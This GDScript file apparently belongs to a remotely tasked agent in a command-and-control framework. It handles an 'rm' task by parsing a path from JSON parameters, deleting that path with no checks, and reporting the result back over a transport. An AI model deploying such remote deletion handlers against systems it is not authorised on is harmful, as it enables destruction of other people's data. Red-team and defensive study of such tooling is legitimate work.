extends Node

func _on_tasking_rm(transport, task):
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var path = parameters.get("path")

	var ret = DirAccess.remove_absolute(path)
	var output = "Removed path: %s" % path

	if ret != OK:
		output = "Error (%d) removing path: %s" % [ret, path]

	transport.send(
		transport.create_task_response(
			ret == OK,
			true,
			task.get("id"),
			output
		)
	)
